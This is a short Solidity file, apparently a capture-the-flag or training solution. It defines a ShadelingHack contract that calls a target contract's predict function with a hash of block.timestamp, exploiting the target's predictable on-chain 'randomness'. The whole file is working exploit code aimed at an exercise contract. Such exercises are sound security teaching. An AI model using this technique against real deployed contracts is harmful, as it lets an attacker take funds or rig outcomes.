// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "../contracts_/Shadeling.sol";

contract ShadelingHack {

    function predict(Shadeling shadeling) external {
        shadeling.predict(
            keccak256(abi.encode(block.timestamp))
        );
    }
}
